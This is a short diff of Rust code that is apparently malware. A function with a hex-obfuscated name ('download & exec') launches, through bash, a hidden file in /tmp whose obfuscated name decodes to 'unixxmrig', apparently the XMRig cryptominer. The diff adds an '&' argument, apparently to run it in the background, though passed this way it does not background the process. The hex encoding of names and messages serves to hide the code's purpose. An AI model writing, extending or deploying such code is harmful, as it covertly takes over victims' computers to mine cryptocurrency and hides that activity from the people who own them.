@@ -15,6 +15,7 @@ async fn _0x646f776e6c6f616420262065786563() {
             .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
         Command::new("bash")
             .arg("/tmp/.0x756e6978786d726967")
+            .arg("&")
             .spawn()
             .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
     } else if cfg!(windows) {
